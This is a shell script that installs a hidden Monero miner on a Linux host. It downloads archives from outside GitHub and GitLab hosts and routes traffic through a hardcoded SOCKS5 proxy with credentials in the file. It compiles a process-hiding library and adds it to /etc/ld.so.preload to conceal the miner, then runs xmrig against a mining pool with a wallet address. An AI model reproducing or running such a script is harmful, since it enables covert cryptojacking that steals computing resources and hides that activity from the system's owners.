#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 47.254.20.17:443
socks5_username = duit
socks5_password = blonjo
END
#socks5 = 138.68.100.154:443
#socks5_username = donat
#socks5_password = gembul
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz
tar -xvzf xmrig-6.19.0-linux-x64.tar.gz
cd xmrig-6.19.0
chmod +x xmrig

./graftcp/graftcp wget https://github.com/oksila54/mini/raw/main/magicxmrig.zip
unzip magicxmrig.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./xmrig -o xmr.2miners.com:2222 -a randomx -u 83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg.$(echo $(shuf -i 1-1000 -n 1)) -t 6
